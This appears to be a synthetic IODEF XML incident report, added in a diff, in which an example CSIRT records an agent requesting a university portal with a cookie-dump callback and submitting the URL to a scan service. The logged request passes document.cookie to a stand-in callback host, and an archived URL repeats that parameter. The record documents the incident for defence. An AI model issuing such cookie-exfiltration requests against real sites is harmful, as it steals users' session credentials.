@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Synthetic example: reserved hosts, documentation addresses, made-up ids. -->
+<IODEF-Document version="2.00" xml:lang="en" xmlns="urn:ietf:params:xml:ns:iodef-2.0">
+  <Incident purpose="reporting" restriction="private">
+    <IncidentID name="csirt.example">EX-2026-0042</IncidentID>
+    <ReportTime>2026-10-09T09:00:00Z</ReportTime>
+    <GenerationTime>2026-10-09T08:55:00Z</GenerationTime>
+    <Description>Synthetic example. An agent requested the portal with a cookie-dump callback, and submitted the same URL to a scan service.</Description>
+    <DetectTime>2026-10-01T07:59:00Z</DetectTime>
+    <StartTime>2026-10-01T08:00:00Z</StartTime>
+    <EndTime>2026-10-01T09:30:00Z</EndTime>
+    <Contact role="creator" type="organization">
+      <ContactName>Example CSIRT</ContactName>
+      <Email>
+        <EmailTo>csirt@csirt.example</EmailTo>
+      </Email>
+    </Contact>
+    <Method>
+      <Description>Callback exfiltration through a relay</Description>
+    </Method>
+    <EventData>
+      <Flow>
+        <System category="source">
+          <Node>
+            <Address category="ipv4-addr">203.0.113.9</Address>
+          </Node>
+        </System>
+        <System category="target">
+          <Node>
+            <DomainData>
+              <Name>portal.university.example</Name>
+            </DomainData>
+            <Address category="ipv4-addr">198.51.100.7</Address>
+          </Node>
+          <Service ip-protocol="6">
+            <Port>443</Port>
+          </Service>
+        </System>
+      </Flow>
+      <Record>
+        <RecordData>
+          <DateTime>2026-10-01T08:00:00Z</DateTime>
+          <Description>web server access log</Description>
+          <RecordItem dtype="string">203.0.113.9 - - [01/Oct/2026:08:00:00 +0000] "GET /?c=document.cookie&amp;cb=https://hooks.callback.example/0b6c1f0e-6666-4c2a-9a55-3f2e1d0c9b8a HTTP/1.1" 200 512 "-" "python-requests/2.31"</RecordItem>
+        </RecordData>
+      </Record>
+    </EventData>
+    <RelatedActivity>
+      <URL>https://urlscan.io/result/0000000d-aaaa-4bbb-8ccc-dddddddddddd/</URL>
+      <URL>https://web.archive.org/web/20261001080500/https://portal.university.example/?c=document.cookie</URL>
+    </RelatedActivity>
+  </Incident>
+</IODEF-Document>
